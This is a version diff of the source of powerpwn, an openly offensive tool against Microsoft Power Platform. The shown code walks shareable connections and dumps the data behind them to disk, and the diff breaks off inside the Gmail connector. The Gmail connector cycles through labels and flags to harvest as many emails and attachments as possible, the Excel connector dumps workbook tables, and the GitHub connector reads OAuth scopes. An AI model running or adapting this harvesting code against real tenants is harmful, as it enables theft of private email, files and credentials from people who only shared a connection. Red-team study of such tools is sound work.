-                    data_records = connector_cls_instance.enum(data_store=data_store)
-                    for data_record in data_records:
-                        data_dump_type_dir = os.path.join(connection_dump_root_dir, data_record.data_record.record_type)
-                        os.makedirs(data_dump_type_dir, exist_ok=True)
-                        data_dump = connector_cls_instance.dump(data_record=data_record)
-                        data_dump_path = os.path.join(data_dump_type_dir, f"{data_record.data_record.record_name}.{data_dump.data_dump.extension}")
-                        encoding = data_dump.data_dump.encoding
-                        extension = data_dump.data_dump.extension
-                        content = data_dump.data_dump.content
-                        if extension == "png":
-                            self.__dump_png(content, data_dump_path)
-                        else:
-                            with open(data_dump_path, "w") as f:
-                                content = content.decode(encoding) if encoding else content
-                                f.write(content)
-                        data_dumps.append(data_dump)
-
-    def __dump_png(self, bytes: bytes, path: str) -> None:
-        image_bytes = base64.b64decode(bytes)
-        img = Image.open(io.BytesIO(image_bytes))
-        img.save(path)
+import base64
+import io
+import os
+from typing import List
+
+import PIL.Image as Image
+import requests
+
+from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors import API_NAME_TO_CONNECTOR_CLS
+from powerpwn.powerdump.collect.data_collectors.enums.data_dump_source import DataDumpSource
+from powerpwn.powerdump.collect.data_collectors.idata_collector import IDataCollector
+from powerpwn.powerdump.collect.models.data_dump_entity import DataDumpWithContext
+from powerpwn.powerdump.collect.models.data_store_entity import DataStoreWithContext
+from powerpwn.powerdump.utils.model_loaders import get_connector, load_connections
+
+
+class ConnectionsDataCollector(IDataCollector):
+    def __init__(self, cache_path: str) -> None:
+        self.__cache_path = cache_path
+
+    def collect(self, session: requests.Session, env_id: str, output_dir_path: str) -> None:
+        data_dumps: List[DataDumpWithContext] = []
+        connections_dumps_root_dir = os.path.join(output_dir_path, DataDumpSource.connections.value)
+
+        for connection in load_connections(cache_path=self.__cache_path, env_id=env_id):
+            current_data_stores: List[DataStoreWithContext] = []
+            connection_id = connection.connection_id
+            api_name = connection.api_name
+
+            connections_apis_dir = os.path.join(connections_dumps_root_dir, connection.api_name)
+            if not connection.shareable:
+                continue
+            if api_name in API_NAME_TO_CONNECTOR_CLS:
+                connection_dump_root_dir = os.path.join(connections_apis_dir, connection.connection_id)
+
+                connector_cls = API_NAME_TO_CONNECTOR_CLS[api_name]
+                spec = get_connector(self.__cache_path, connection.environment_id, connector_cls.api_name())
+
+                connector_cls_instance = connector_cls(session=session, spec=spec, connection_id=connection_id)
+                current_data_stores = connector_cls_instance.ping(connection_parameters=connection.connection_parameters)
+
+                for data_store in current_data_stores:
+                    data_records = connector_cls_instance.enum(data_store=data_store)
+                    for data_record in data_records:
+                        data_dump_type_dir = os.path.join(connection_dump_root_dir, data_record.data_record.record_type)
+                        os.makedirs(data_dump_type_dir, exist_ok=True)
+                        data_dump = connector_cls_instance.dump(data_record=data_record)
+                        data_dump_path = os.path.join(data_dump_type_dir, f"{data_record.data_record.record_name}.{data_dump.data_dump.extension}")
+                        encoding = data_dump.data_dump.encoding
+                        extension = data_dump.data_dump.extension
+                        content = data_dump.data_dump.content
+                        if extension == "png":
+                            self.__dump_png(content, data_dump_path)
+                        else:
+                            with open(data_dump_path, "w") as f:
+                                content = content.decode(encoding) if encoding else content
+                                f.write(content)
+                        data_dumps.append(data_dump)
+
+    def __dump_png(self, bytes: bytes, path: str) -> None:
+        image_bytes = base64.b64decode(bytes)
+        img = Image.open(io.BytesIO(image_bytes))
+        img.save(path)
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/__init__.py` & `powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/__init__.py`

 * *Ordering differences only*

 * *Files 17% similar despite different names*

```diff
@@ -1,22 +1,22 @@
-from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.excelonlinebusiness import ExcelOnlineBusinessConnector
-from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.github import GitHubConnector
-from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.gmail import GmailConnector
-from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.keyvault import KeyVaultConnector
-from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.shared_azureblob import SharedAzureBlobConnector
-from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.shared_azurequeues import SharedAzureQueuesConnector
-from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.shared_azuretables import SharedAzureTablesConnector
-from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.shared_documentdb import SharedDocumentDBConnector
-from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.shared_sql import SharedSqlConnector
-
-CONNECTOR_CLS_SET = {
-    KeyVaultConnector,
-    GitHubConnector,
-    GmailConnector,
-    ExcelOnlineBusinessConnector,
-    SharedSqlConnector,
-    SharedDocumentDBConnector,
-    SharedAzureTablesConnector,
-    SharedAzureBlobConnector,
-    SharedAzureQueuesConnector,
-}
-API_NAME_TO_CONNECTOR_CLS = {connector_cls.api_name(): connector_cls for connector_cls in CONNECTOR_CLS_SET}
+from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.excelonlinebusiness import ExcelOnlineBusinessConnector
+from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.github import GitHubConnector
+from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.gmail import GmailConnector
+from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.keyvault import KeyVaultConnector
+from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.shared_azureblob import SharedAzureBlobConnector
+from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.shared_azurequeues import SharedAzureQueuesConnector
+from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.shared_azuretables import SharedAzureTablesConnector
+from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.shared_documentdb import SharedDocumentDBConnector
+from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.shared_sql import SharedSqlConnector
+
+CONNECTOR_CLS_SET = {
+    KeyVaultConnector,
+    GitHubConnector,
+    GmailConnector,
+    ExcelOnlineBusinessConnector,
+    SharedSqlConnector,
+    SharedDocumentDBConnector,
+    SharedAzureTablesConnector,
+    SharedAzureBlobConnector,
+    SharedAzureQueuesConnector,
+}
+API_NAME_TO_CONNECTOR_CLS = {connector_cls.api_name(): connector_cls for connector_cls in CONNECTOR_CLS_SET}
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/connector_base.py` & `powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/connector_base.py`

 * *Ordering differences only*

 * *Files 12% similar despite different names*

```diff
@@ -1,71 +1,71 @@
-import abc
-from typing import List
-
-import requests
-
-from powerpwn.powerdump.collect.models.connector_entity import Connector
-from powerpwn.powerdump.collect.models.data_dump_entity import DataDump, DataDumpWithContext
-from powerpwn.powerdump.collect.models.data_record_entity import DataRecord, DataRecordWithContext
-from powerpwn.powerdump.collect.models.data_store_entity import DataStore, DataStoreWithContext
-
-
-class ConnectorBase(abc.ABC):
-    def __init__(self, session: requests.Session, spec: Connector, connection_id: str):
-        self._session = session
-        self._environment_id = spec.environment_id
-        self._connection_id = connection_id
-
-        host = spec.swagger["host"]
-        base_path = spec.swagger["basePath"]
-        self._root = f"https://{host}{base_path}/{connection_id}"
-
-    def ping(self, connection_parameters: dict) -> List[DataStoreWithContext]:
-        """
-        Test connection to api
-
-        Args:
-            connection_parameters (dict): connection parameters to api
-
-        Returns:
-            list[DataStoreWithContext]: list of data store entities to query
-        """
-        return [
-            DataStoreWithContext(api_name=self.api_name(), connection_id=self._connection_id, data_store=data_store)
-            for data_store in self._ping(connection_parameters=connection_parameters)
-        ]
-
-    def _ping(self, connection_parameters: dict) -> List[DataStore]:
-        pass
-
-    def enum(self, data_store: DataStoreWithContext) -> List[DataRecordWithContext]:
-        return [DataRecordWithContext(data_store=data_store, data_record=data_record) for data_record in self._enum(data_store=data_store)]
-
-    def _enum(self, data_store: DataStoreWithContext) -> List[DataRecord]:
-        pass
-
-    def dump(self, data_record: DataRecordWithContext) -> DataDumpWithContext:
-        """
-        Dump data
-
-        Args:
-            data_record (DataRecordWithContext): data record details to dump
-
-        Returns:
-            DataDumpWithContext: dump data
-        """
-        return DataDumpWithContext(data_record=data_record, data_dump=self._dump(data_record=data_record))
-
-    def _dump(self, data_record: DataRecordWithContext) -> DataDump:
-        pass
-
-    @classmethod
-    def api_name(cls) -> str:
-        pass
-
-    @classmethod
-    def _apim_path(cls) -> str:
-        pass
-
-    @classmethod
-    def uses_undocumented_api_properties(cls) -> bool:
-        return False
+import abc
+from typing import List
+
+import requests
+
+from powerpwn.powerdump.collect.models.connector_entity import Connector
+from powerpwn.powerdump.collect.models.data_dump_entity import DataDump, DataDumpWithContext
+from powerpwn.powerdump.collect.models.data_record_entity import DataRecord, DataRecordWithContext
+from powerpwn.powerdump.collect.models.data_store_entity import DataStore, DataStoreWithContext
+
+
+class ConnectorBase(abc.ABC):
+    def __init__(self, session: requests.Session, spec: Connector, connection_id: str):
+        self._session = session
+        self._environment_id = spec.environment_id
+        self._connection_id = connection_id
+
+        host = spec.swagger["host"]
+        base_path = spec.swagger["basePath"]
+        self._root = f"https://{host}{base_path}/{connection_id}"
+
+    def ping(self, connection_parameters: dict) -> List[DataStoreWithContext]:
+        """
+        Test connection to api
+
+        Args:
+            connection_parameters (dict): connection parameters to api
+
+        Returns:
+            list[DataStoreWithContext]: list of data store entities to query
+        """
+        return [
+            DataStoreWithContext(api_name=self.api_name(), connection_id=self._connection_id, data_store=data_store)
+            for data_store in self._ping(connection_parameters=connection_parameters)
+        ]
+
+    def _ping(self, connection_parameters: dict) -> List[DataStore]:
+        pass
+
+    def enum(self, data_store: DataStoreWithContext) -> List[DataRecordWithContext]:
+        return [DataRecordWithContext(data_store=data_store, data_record=data_record) for data_record in self._enum(data_store=data_store)]
+
+    def _enum(self, data_store: DataStoreWithContext) -> List[DataRecord]:
+        pass
+
+    def dump(self, data_record: DataRecordWithContext) -> DataDumpWithContext:
+        """
+        Dump data
+
+        Args:
+            data_record (DataRecordWithContext): data record details to dump
+
+        Returns:
+            DataDumpWithContext: dump data
+        """
+        return DataDumpWithContext(data_record=data_record, data_dump=self._dump(data_record=data_record))
+
+    def _dump(self, data_record: DataRecordWithContext) -> DataDump:
+        pass
+
+    @classmethod
+    def api_name(cls) -> str:
+        pass
+
+    @classmethod
+    def _apim_path(cls) -> str:
+        pass
+
+    @classmethod
+    def uses_undocumented_api_properties(cls) -> bool:
+        return False
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/excelonlinebusiness.py` & `powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/excelonlinebusiness.py`

 * *Ordering differences only*

 * *Files 16% similar despite different names*

```diff
@@ -1,144 +1,144 @@
-import json
-from typing import Any, Dict, List
-
-from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.connector_base import ConnectorBase
-from powerpwn.powerdump.collect.data_collectors.enums.data_dump_type import DataDumpType
-from powerpwn.powerdump.collect.models.data_dump_entity import DataDump
-from powerpwn.powerdump.collect.models.data_record_entity import DataRecord, DataRecordWithContext
-from powerpwn.powerdump.collect.models.data_store_entity import DataStore, DataStoreWithContext
-from powerpwn.powerdump.utils.const import ENCODING
-from powerpwn.powerdump.utils.requests_wrapper import consecutive_gets, request_and_verify
-
-
-class ExcelOnlineBusinessConnector(ConnectorBase):
-    def _ping(self, connection_parameters: Dict[str, Any]) -> List[DataStore]:
-        records: List[DataStore] = []
-
-        sources_success, sources_val = consecutive_gets(
-            session=self._session, expected_status_prefix="200", url=f"{self._root}/codeless/v1.0/sources"
-        )
-
-        if sources_success:
-            for source in sources_val:
-                source_id = source["id"]
-
-                params = {"source": source_id}
-                drives_success, drives_val = consecutive_gets(
-                    session=self._session, expected_status_prefix="200", url=f"{self._root}/codeless/v1.0/drives", params=params
-                )
-
-                if drives_success:
-                    for drive in drives_val:
-                        records.append(
-                            DataStore(
-                                tenant=None,
-                                account=connection_parameters["accountName"],
-                                scope=None,
-                                host=drive["webUrl"],
-                                name=drive["name"],
-                                extra={"source": source, "drive": drive},
-                            )
-                        )
-
-        return records
-
-    def __enum_dir(self, source_id: str, drive_id: str, folder_id: str) -> List[Dict[str, Any]]:
-        file_objs: List[Dict[str, Any]] = []
-
-        if folder_id == "root":
-            folder_path = "root"
-        else:
-            folder_path = f"items/{folder_id}"
-
-        params = {"source": source_id}
-        can_list_folder, _, list_folder_val = request_and_verify(
-            session=self._session,
-            expected_status_prefix="200",
-            method="get",
-            url=f"{self._root}/codeless/v1.0/drives/{drive_id}/{folder_path}/children",
-            params=params,
-        )
-        if can_list_folder:
-            if not isinstance(list_folder_val, list):
-                raise ValueError(f"Unexpected response list_folder_val: {list_folder_val}.")
-
-            for file_or_dir_obj in list_folder_val:
-                if not isinstance(file_or_dir_obj, dict):
-                    raise ValueError(f"Unexpected response file_or_dir_obj: {file_or_dir_obj}.")
-                if file_or_dir_obj["IsFolder"]:
-                    file_objs += self.__enum_dir(source_id=source_id, drive_id=drive_id, folder_id=file_or_dir_obj["Id"])
-                else:
-                    file_objs += [file_or_dir_obj]
-
-        return file_objs
-
-    def _enum(self, data_store: DataStoreWithContext) -> List[DataRecord]:
-        data_records: List[DataRecord] = []
-
-        source_id = data_store.data_store.extra["source"]["id"]
-        drive_id = data_store.data_store.extra["drive"]["id"]
-
-        drive_files = self.__enum_dir(source_id=source_id, drive_id=drive_id, folder_id="root")
-
-        for file_obj in drive_files:
-            file_id = file_obj["Id"]
-
-            params = {"source": source_id}
-            tables_success, tables_val = consecutive_gets(
-                session=self._session,
-                expected_status_prefix="200",
-                url=f"{self._root}/codeless/v1.0/drives/{drive_id}/items/{file_id}/workbook/tables",
-                params=params,
-            )
-
-            if tables_success:
-                for table_obj in tables_val:
-                    table_id = table_obj["id"]
-
-                    data_records.append(
-                        DataRecord(
-                            record_type=DataDumpType.table,
-                            record_id=table_id,
-                            record_name=f"{file_obj['Path']}/{table_obj['name']}",
-                            extra={"file": file_obj, "table": table_obj},
-                        )
-                    )
-
-        return data_records
-
-    def _dump(self, data_record: DataRecordWithContext) -> DataDump:
-        if data_record.data_record.record_type == DataDumpType.table:
-            source_id = data_record.data_store.data_store.extra["source"]["id"]
-            drive_id = data_record.data_store.data_store.extra["drive"]["id"]
-            file_id = data_record.data_record.extra["file"]["Id"]
-            table_id = data_record.data_record.extra["table"]["id"]
-
-            success, rows_val = consecutive_gets(
-                session=self._session,
-                expected_status_prefix="200",
-                url=f"{self._root}/drives/{drive_id}/files/{file_id}/tables/{table_id}/items",
-                params={"source": source_id},
-            )
-            if success:
-                extension = "json"
-                encoding = ENCODING
-                content = json.dumps(rows_val).encode(ENCODING)
-
-        else:
-            raise ValueError(f"Unsupported data type: {data_record.data_record.record_type}.")
-
-        if not success:
-            raise ValueError(
-                f"Unable to fetch value for data type: {data_record.data_record.record_type} with ID: {data_record.data_record.record_id}."
-            )
-
-        data_dump = DataDump(extension=extension, encoding=encoding, content=content)
-        return data_dump
-
-    @classmethod
-    def api_name(cls) -> str:
-        return "shared_excelonlinebusiness"
-
-    @classmethod
-    def _apim_path(cls) -> str:
-        return "excelonlinebusiness"
+import json
+from typing import Any, Dict, List
+
+from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.connector_base import ConnectorBase
+from powerpwn.powerdump.collect.data_collectors.enums.data_dump_type import DataDumpType
+from powerpwn.powerdump.collect.models.data_dump_entity import DataDump
+from powerpwn.powerdump.collect.models.data_record_entity import DataRecord, DataRecordWithContext
+from powerpwn.powerdump.collect.models.data_store_entity import DataStore, DataStoreWithContext
+from powerpwn.powerdump.utils.const import ENCODING
+from powerpwn.powerdump.utils.requests_wrapper import consecutive_gets, request_and_verify
+
+
+class ExcelOnlineBusinessConnector(ConnectorBase):
+    def _ping(self, connection_parameters: Dict[str, Any]) -> List[DataStore]:
+        records: List[DataStore] = []
+
+        sources_success, sources_val = consecutive_gets(
+            session=self._session, expected_status_prefix="200", url=f"{self._root}/codeless/v1.0/sources"
+        )
+
+        if sources_success:
+            for source in sources_val:
+                source_id = source["id"]
+
+                params = {"source": source_id}
+                drives_success, drives_val = consecutive_gets(
+                    session=self._session, expected_status_prefix="200", url=f"{self._root}/codeless/v1.0/drives", params=params
+                )
+
+                if drives_success:
+                    for drive in drives_val:
+                        records.append(
+                            DataStore(
+                                tenant=None,
+                                account=connection_parameters["accountName"],
+                                scope=None,
+                                host=drive["webUrl"],
+                                name=drive["name"],
+                                extra={"source": source, "drive": drive},
+                            )
+                        )
+
+        return records
+
+    def __enum_dir(self, source_id: str, drive_id: str, folder_id: str) -> List[Dict[str, Any]]:
+        file_objs: List[Dict[str, Any]] = []
+
+        if folder_id == "root":
+            folder_path = "root"
+        else:
+            folder_path = f"items/{folder_id}"
+
+        params = {"source": source_id}
+        can_list_folder, _, list_folder_val = request_and_verify(
+            session=self._session,
+            expected_status_prefix="200",
+            method="get",
+            url=f"{self._root}/codeless/v1.0/drives/{drive_id}/{folder_path}/children",
+            params=params,
+        )
+        if can_list_folder:
+            if not isinstance(list_folder_val, list):
+                raise ValueError(f"Unexpected response list_folder_val: {list_folder_val}.")
+
+            for file_or_dir_obj in list_folder_val:
+                if not isinstance(file_or_dir_obj, dict):
+                    raise ValueError(f"Unexpected response file_or_dir_obj: {file_or_dir_obj}.")
+                if file_or_dir_obj["IsFolder"]:
+                    file_objs += self.__enum_dir(source_id=source_id, drive_id=drive_id, folder_id=file_or_dir_obj["Id"])
+                else:
+                    file_objs += [file_or_dir_obj]
+
+        return file_objs
+
+    def _enum(self, data_store: DataStoreWithContext) -> List[DataRecord]:
+        data_records: List[DataRecord] = []
+
+        source_id = data_store.data_store.extra["source"]["id"]
+        drive_id = data_store.data_store.extra["drive"]["id"]
+
+        drive_files = self.__enum_dir(source_id=source_id, drive_id=drive_id, folder_id="root")
+
+        for file_obj in drive_files:
+            file_id = file_obj["Id"]
+
+            params = {"source": source_id}
+            tables_success, tables_val = consecutive_gets(
+                session=self._session,
+                expected_status_prefix="200",
+                url=f"{self._root}/codeless/v1.0/drives/{drive_id}/items/{file_id}/workbook/tables",
+                params=params,
+            )
+
+            if tables_success:
+                for table_obj in tables_val:
+                    table_id = table_obj["id"]
+
+                    data_records.append(
+                        DataRecord(
+                            record_type=DataDumpType.table,
+                            record_id=table_id,
+                            record_name=f"{file_obj['Path']}/{table_obj['name']}",
+                            extra={"file": file_obj, "table": table_obj},
+                        )
+                    )
+
+        return data_records
+
+    def _dump(self, data_record: DataRecordWithContext) -> DataDump:
+        if data_record.data_record.record_type == DataDumpType.table:
+            source_id = data_record.data_store.data_store.extra["source"]["id"]
+            drive_id = data_record.data_store.data_store.extra["drive"]["id"]
+            file_id = data_record.data_record.extra["file"]["Id"]
+            table_id = data_record.data_record.extra["table"]["id"]
+
+            success, rows_val = consecutive_gets(
+                session=self._session,
+                expected_status_prefix="200",
+                url=f"{self._root}/drives/{drive_id}/files/{file_id}/tables/{table_id}/items",
+                params={"source": source_id},
+            )
+            if success:
+                extension = "json"
+                encoding = ENCODING
+                content = json.dumps(rows_val).encode(ENCODING)
+
+        else:
+            raise ValueError(f"Unsupported data type: {data_record.data_record.record_type}.")
+
+        if not success:
+            raise ValueError(
+                f"Unable to fetch value for data type: {data_record.data_record.record_type} with ID: {data_record.data_record.record_id}."
+            )
+
+        data_dump = DataDump(extension=extension, encoding=encoding, content=content)
+        return data_dump
+
+    @classmethod
+    def api_name(cls) -> str:
+        return "shared_excelonlinebusiness"
+
+    @classmethod
+    def _apim_path(cls) -> str:
+        return "excelonlinebusiness"
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/github.py` & `powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/github.py`

 * *Ordering differences only*

 * *Files 19% similar despite different names*

```diff
@@ -1,45 +1,45 @@
-from typing import List
-
-from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.connector_base import ConnectorBase
-from powerpwn.powerdump.collect.models.data_dump_entity import DataDump
-from powerpwn.powerdump.collect.models.data_record_entity import DataRecord, DataRecordWithContext
-from powerpwn.powerdump.collect.models.data_store_entity import DataStore, DataStoreWithContext
-from powerpwn.powerdump.utils.requests_wrapper import request_and_verify
-
-
-class GitHubConnector(ConnectorBase):
-    def _ping(self, connection_parameters: dict) -> List[DataStore]:
-        records: List[DataStore] = []
-
-        # while spec documents status_code 200 on success, 202 has been observed as well
-        success, head, val = request_and_verify(
-            session=self._session, expected_status_prefix="20", method="get", url=f"{self._root}/trigger/issueClosed"
-        )
-
-        if success:
-            records.append(
-                DataStore(
-                    tenant=None, account=head["x-oauth-client-id"], scope=head["x-oauth-scopes"], host="https://api.github.com/", name=None, extra={}
-                )
-            )
-
-        return records
-
-    def _enum(self, data_store: DataStoreWithContext) -> List[DataRecord]:
-        raise NotImplementedError()
-
-    def _dump(self, data_record: DataRecordWithContext) -> DataDump:
-        raise NotImplementedError()
-
-    @classmethod
-    def api_name(cls) -> str:
-        return "shared_github"
-
-    @classmethod
-    def _apim_path(cls) -> str:
-        return "github"
-
-    @classmethod
-    def uses_undocumented_api_properties(cls) -> bool:
-        # headers returned from the API are not documented in the swagger
-        return True
+from typing import List
+
+from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.connector_base import ConnectorBase
+from powerpwn.powerdump.collect.models.data_dump_entity import DataDump
+from powerpwn.powerdump.collect.models.data_record_entity import DataRecord, DataRecordWithContext
+from powerpwn.powerdump.collect.models.data_store_entity import DataStore, DataStoreWithContext
+from powerpwn.powerdump.utils.requests_wrapper import request_and_verify
+
+
+class GitHubConnector(ConnectorBase):
+    def _ping(self, connection_parameters: dict) -> List[DataStore]:
+        records: List[DataStore] = []
+
+        # while spec documents status_code 200 on success, 202 has been observed as well
+        success, head, val = request_and_verify(
+            session=self._session, expected_status_prefix="20", method="get", url=f"{self._root}/trigger/issueClosed"
+        )
+
+        if success:
+            records.append(
+                DataStore(
+                    tenant=None, account=head["x-oauth-client-id"], scope=head["x-oauth-scopes"], host="https://api.github.com/", name=None, extra={}
+                )
+            )
+
+        return records
+
+    def _enum(self, data_store: DataStoreWithContext) -> List[DataRecord]:
+        raise NotImplementedError()
+
+    def _dump(self, data_record: DataRecordWithContext) -> DataDump:
+        raise NotImplementedError()
+
+    @classmethod
+    def api_name(cls) -> str:
+        return "shared_github"
+
+    @classmethod
+    def _apim_path(cls) -> str:
+        return "github"
+
+    @classmethod
+    def uses_undocumented_api_properties(cls) -> bool:
+        # headers returned from the API are not documented in the swagger
+        return True
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/gmail.py` & `powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connectors/gmail.py`

 * *Ordering differences only*

 * *Files 19% similar despite different names*

```diff
@@ -1,138 +1,138 @@
-from typing import List, Set
-
-from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.connector_base import ConnectorBase
-from powerpwn.powerdump.collect.data_collectors.enums.data_dump_type import DataDumpType
-from powerpwn.powerdump.collect.models.data_dump_entity import DataDump
-from powerpwn.powerdump.collect.models.data_record_entity import DataRecord, DataRecordWithContext
-from powerpwn.powerdump.collect.models.data_store_entity import DataStore, DataStoreWithContext
-from powerpwn.powerdump.utils.const import ENCODING
-from powerpwn.powerdump.utils.requests_wrapper import request_and_verify
-
-
-class GmailConnector(ConnectorBase):
-    def _ping(self, connection_parameters: dict) -> List[DataStore]:
-        success, _, _ = request_and_verify(session=self._session, expected_status_prefix="200", method="get", url=f"{self._root}/TestConnection")
-
-        if success:
-            return [
-                DataStore(
-                    tenant=None, account=connection_parameters["accountName"], scope=None, host="https://gmail.googleapis.com/", name=None, extra={}
-                )
-            ]
-        return []
-
-    def _enum(self, data_store: DataStoreWithContext) -> List[DataRecord]:
-        data_records: List[DataRecord] = []
-        unique_email_ids_seen: Set[str] = set()
-
-        can_list_labels, _, labels_val = request_and_verify(
-            session=self._session, expected_status_prefix="200", method="get", url=f"{self._root}/Mail/Labels"
-        )
-        if can_list_labels:
-            # Iterate over parameters to enum as many emails as possible
-            for label_obj in labels_val:
-                for fetch_only_with_attachments in (True, False):
-                    for importance in ("Important", "Not important"):
-                        for starred in ("Starred", "Not starred"):
-                            params = {
-                                "label": label_obj["Id"],
-                                "importance": importance,
-                                "starred": starred,
-                                "fetchOnlyWithAttachments": fetch_only_with_attachments,
-                                "includeAttachments": True,
-                                "subject": "",
-                            }
-
-                            # Iterate over as many subjects as possible
-                            get_email_success = True
-                            while get_email_success:
-                                get_email_success, _, get_email_val = request_and_verify(
-                                    session=self._session,
-                                    expected_status_prefix="200",
-                                    method="get",
-                                    url=f"{self._root}/Mail/LastReceived",
-                                    params=params,
-                                )
-
-                                if get_email_success:
-                                    if get_email_val.get("Id") not in unique_email_ids_seen:
-                                        data_records.append(
-                                            DataRecord(
-                                                record_type=DataDumpType.email,
-                                                record_id=get_email_val["Id"],
-                                                record_name=get_email_val["Subject"],
-                                                extra={k: v for k, v in get_email_val.items() if k not in {"Body", "Attachments"}},
-                                            )
-                                        )
-
-                                        for attachment_obj in get_email_val["Attachments"]:
-                                            data_records.append(
-                                                DataRecord(
-                                                    record_type=DataDumpType.attachment,
-                                                    record_id=get_email_val["Id"],
-                                                    record_name=attachment_obj["Name"],
-                                                    extra={k: v for k, v in attachment_obj.items() if k not in {"ContentBytes"}},
-                                                )
-                                            )
-
-                                        # avoid processing the same email twice
-                                        unique_email_ids_seen.add(get_email_val["Id"])
-
-                                    # Ignore identical subjects to continue iteration
-                                    params["subject"] += f" -{get_email_val['Subject']}"
-
-        return data_records
-
-    def _dump(self, data_record: DataRecordWithContext) -> DataDump:
-        if data_record.data_record.record_type == DataDumpType.email:
-            success, _, get_email_val = request_and_verify(
-                session=self._session,
-                expected_status_prefix="200",
-                method="get",
-                url=f"{self._root}/Mail/{data_record.data_record.record_id}",
-                params={"includeAttachments": False},
-            )
-            if success:
-                extension = "html" if data_record.data_record.extra.get("IsHtml", False) else "txt"
-                encoding = ENCODING
-                content = get_email_val["Body"].encode(ENCODING)
-
-        elif data_record.data_record.record_type == DataDumpType.attachment:
-            success, _, get_email_val = request_and_verify(
-                session=self._session,
-                expected_status_prefix="200",
-                method="get",
-                url=f"{self._root}/Mail/{data_record.data_record.record_id}",
-                params={"includeAttachments": True},
-            )
-
-            if success:
-                for attachment_obj in get_email_val["Attachments"]:
-                    if attachment_obj["Name"] == data_record.data_record.record_name:
-                        extension = attachment_obj["ContentType"].partition('name="')[2].partition(".")[-1].replace('"', "")
-                        encoding = None
-                        content = attachment_obj["ContentBytes"]
-
-                        # We are looking for a specific attachment
-                        break
-                else:
-                    # Couldn't find relevant attachment
-                    success = False
-        else:
-            raise ValueError(f"Unsupported data type: {data_record.data_record.record_type}.")
-
-        if not success:
-            raise ValueError(
-                f"Unable to fetch value for data type: {data_record.data_record.record_type} with ID: {data_record.data_record.record_id}."
-            )
-
-        data_dump = DataDump(extension=extension, encoding=encoding, content=content)
-        return data_dump
-
-    @classmethod
-    def api_name(cls) -> str:
-        return "shared_gmail"
-
-    @classmethod
-    def _apim_path(cls) -> str:
-        return "gmail"
+from typing import List, Set
+
+from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors.connector_base import ConnectorBase
+from powerpwn.powerdump.collect.data_collectors.enums.data_dump_type import DataDumpType
+from powerpwn.powerdump.collect.models.data_dump_entity import DataDump
+from powerpwn.powerdump.collect.models.data_record_entity import DataRecord, DataRecordWithContext
+from powerpwn.powerdump.collect.models.data_store_entity import DataStore, DataStoreWithContext
+from powerpwn.powerdump.utils.const import ENCODING
+from powerpwn.powerdump.utils.requests_wrapper import request_and_verify
+
+
+class GmailConnector(ConnectorBase):
+    def _ping(self, connection_parameters: dict) -> List[DataStore]:
+        success, _, _ = request_and_verify(session=self._session, expected_status_prefix="200", method="get", url=f"{self._root}/TestConnection")
+
+        if success:
+            return [
+                DataStore(
+                    tenant=None, account=connection_parameters["accountName"], scope=None, host="https://gmail.googleapis.com/", name=None, extra={}
+                )
+            ]
+        return []
+
+    def _enum(self, data_store: DataStoreWithContext) -> List[DataRecord]:
+        data_records: List[DataRecord] = []
+        unique_email_ids_seen: Set[str] = set()
+
+        can_list_labels, _, labels_val = request_and_verify(
+            session=self._session, expected_status_prefix="200", method="get", url=f"{self._root}/Mail/Labels"
+        )
+        if can_list_labels:
+            # Iterate over parameters to enum as many emails as possible
+            for label_obj in labels_val:
+                for fetch_only_with_attachments in (True, False):
+                    for importance in ("Important", "Not important"):
+                        for starred in ("Starred", "Not starred"):
+                            params = {
+                                "label": label_obj["Id"],
+                                "importance": importance,
+                                "starred": starred,
+                                "fetchOnlyWithAttachments": fetch_only_with_attachments,
+                                "includeAttachments": True,
+                                "subject": "",
+                            }
+
+                            # Iterate over as many subjects as possible
+                            get_email_success = True
+                            while get_email_success:
+                                get_email_success, _, get_email_val = request_and_verify(
+                                    session=self._session,
+                                    expected_status_prefix="200",
+                                    method="get",
+                                    url=f"{self._root}/Mail/LastReceived",
+                                    params=params,
+                                )
+
+                                if get_email_success:
+                                    if get_email_val.get("Id") not in unique_email_ids_seen:
+                                        data_records.append(
+                                            DataRecord(
+                                                record_type=DataDumpType.email,
+                                                record_id=get_email_val["Id"],
+                                                record_name=get_email_val["Subject"],
